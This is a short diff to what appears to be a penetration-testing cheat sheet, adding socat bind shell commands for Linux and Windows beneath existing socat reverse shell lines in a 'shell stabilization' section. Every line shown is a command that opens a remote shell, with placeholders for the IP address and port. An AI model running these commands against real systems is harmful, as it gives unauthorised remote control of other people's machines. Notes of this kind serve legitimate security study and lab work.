@@ -89,5 +89,8 @@ SHELL STABILIZATION
 					- Windows: ```socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes```
 					- Linux: ```socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"```				
 			- Bind shell: 
+				- linux: ```socat TCP-L:<PORT> EXEC:"bash -li"```
+				- Windows: ```socat TCP-L:<PORT> EXEC:powershell.exe,pipes```
+				- call: ```socat TCP:<TARGET-IP>:<TARGET-PORT> -```
 	- General:
 		- change terminal size with stty <rows or cols> <num>
